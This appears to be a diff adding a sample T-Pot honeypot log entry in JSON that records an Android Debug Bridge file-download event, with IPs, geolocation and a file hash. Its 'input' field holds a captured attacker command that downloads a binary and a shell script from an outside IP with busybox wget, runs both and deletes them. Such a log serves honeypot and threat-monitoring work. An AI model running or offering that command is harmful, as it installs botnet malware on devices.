@@ -1,0 +1,72 @@
+[
+    {
+    	"logsource": "tpot",
+        "timestamp": "2023-07-03T12:29:11.872727Z",
+		"src_ip": "1.1.1.1",
+		"src_port": "22",
+        "eventid": "adbhoney.session.file_download",
+		"src_url": "http://5.181.80.102/armv7l",
+		"shasum": "a6343f61a74b6dd4944ece328fa549deb751ebedcc13ce49c6bf3bd81d27a3a1",
+		"outfile": "dl/a6343f61a74b6dd4944ece328fa549deb751ebedcc13ce49c6bf3bd81d27a3a1.raw",
+		"filename": "armv7l",
+		"session": "fb5fb8ee01ab",
+		"unixtime": 1688673914,
+		"duration": "21.41",
+		"type": "Adbhoney",
+		"t-pot_ip_ext": "40.76.178.241",
+		"@timestamp": "2023-07-06T17:13:04.294Z",
+		"host": "4b2c8c0db01d",
+		"sensor": "honeypot01",
+		"t-pot_ip_int": "10.0.2.4",
+		"ip_rep": "known attacker",
+		"geoip": {
+			"timezone": "America/Denver",
+			"region_name": "South Dakota",
+			"region_code": "SD",
+			"location": {
+				"lat": 44.0051,
+				"lon": -103.3663
+			},
+			"continent_code": "NA",
+			"country_name": "United States",
+			"country_code2": "US",
+			"postal_code": "57702",
+			"dma_code": 764,
+			"as_org": "CLARITY-TELECOM",
+			"ip": "67.158.14.241",
+			"asn": 20412,
+			"latitude": 44.0051,
+			"city_name": "Rapid City",
+			"country_code3": "US",
+			"longitude": -103.3663
+		},
+		"t-pot_hostname": "tragicsaw",
+		"geoip_ext": {
+			"timezone": "America/New_York",
+			"region_name": "Virginia",
+			"region_code": "VA",
+			"location": {
+				"lat": 37.9273,
+				"lon": -76.8545
+			},
+			"continent_code": "NA",
+			"country_name": "United States",
+			"country_code2": "US",
+			"postal_code": "22560",
+			"dma_code": 556,
+			"as_org": "MICROSOFT-CORP-MSN-AS-BLOCK",
+			"ip": "40.76.178.241",
+			"asn": 8075,
+			"latitude": 37.9273,
+			"city_name": "Tappahannock",
+			"country_code3": "US",
+			"longitude": -76.8545
+		},
+		"City": "Charlotte",
+		"ASN": "AS5432",
+    	"ls_timestamp": "2023-07-03T00:00:00.000Z",
+    	"ls_version": "1",
+		"input": "cd /data/local/tmp; busybox wget http://5.181.80.102/armv7l; chmod 777 armv7l; ./armv7l; rm -rf armv7l; busybox wget http://5.181.80.102/bins.sh; sh bins.sh; rm -rf bins.sh",
+        "protocol": "tls"
+    }
+]
